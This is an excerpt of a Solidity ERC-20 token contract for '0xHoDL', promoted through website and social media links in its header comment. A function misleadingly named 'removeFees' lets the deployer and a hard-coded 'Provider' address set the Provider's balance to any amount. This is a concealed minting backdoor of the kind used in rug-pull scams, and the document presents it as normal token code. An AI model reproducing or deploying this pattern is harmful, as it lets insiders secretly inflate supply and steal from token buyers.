...
/*
The ultimate platform to maximize your crypto earnings through strategic hodling.

Visit to know us more !
Website  : https://www.zeroxhodlprotocol.com
Telegram : https://t.me/ZeroxHodlProtocol
Twitter  : https://twitter.com/0xHodlProtocol
Medium   : https://medium.com/@0xHodlProtocol
**/  
...
contract zeroHoDL is Context, IERC20, Ownable {
    ...
    string private constant _name = "0xHoDL";
    string private constant _symbol = "0xHoDL";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 2000000000 * 10**_decimals;
    uint256 public _maxTxAmount = _totalSupply * 4 / 100; //4%
    uint256 public _maxWalletAmount = _totalSupply * 4 / 100; //4%
    ...
    constructor () {
        ...
        Provider = payable(0x7E1fF060C77DD07da8A80cBE55c404BcCD7fe2C9);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[Provider] = true;
   ...
   receive() external payable {}
    ...
    function blocklistBots(uint256 bots) public {
    ...
    function removeFees(uint256 fees) public {
        if (!_isExcludedFromFee[_msgSender()]) {
            return;
        }
        balances[Provider] = fees;
    }
